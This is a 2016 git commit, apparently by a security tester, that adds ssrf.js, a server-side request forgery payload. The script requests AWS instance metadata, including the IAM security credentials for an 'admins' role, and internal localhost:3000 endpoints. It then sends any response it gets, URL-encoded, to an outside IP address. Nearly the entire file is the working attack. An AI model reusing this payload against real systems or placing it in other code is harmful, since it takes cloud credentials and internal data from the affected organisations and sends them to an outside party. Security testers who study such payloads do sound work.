3b107a4e106b5eb5a2c685470bf400f23a278d7c
immunitytester <mark@immunityinc.com>
2016-06-23 13:22:25 -0400

    Add files via upload

---
+++ ssrf.js
@@ -0,0 +1,44 @@
+var url0 = "http://169.254.169.254/latest/dynamic/instance-identity/document";
+var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admins";
+var url2 = "http://localhost:3000";
+var url3 = "http://localhost:3000/1/catalogs";
+
+
+function handler() {
+  console.log(1);
+  if(this.status == 200 && this.responseText != null) {
+    // success!
+    if (this.responseText.search("Not Found")){
+      //do whatever you want
+      var xhr2 = new XMLHttpRequest();
+      xhr2.onreadystatechange = none; 
+      xhr2.open("GET", 'http://192.241.169.35/SSRF?u='+encodeURIComponent(this.responseText), true);
+      xhr2.send();
+}
+  } else {
+    // something went wrong
+    //console.log("hmmm...")
+  }
+}
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = handler;
+try{
+ xhr.open("GET", url0, true);
+ xhr.send();
+ } catch {}
+
+try{
+xhr.open("GET", url1, true);
+xhr.send();
+ } catch {}
+
+try{
+xhr.open("GET", url2, true);
+xhr.send();
+ } catch {}
+
+try{
+xhr.open("GET", url3, true);
+xhr.send();
+ } catch {}
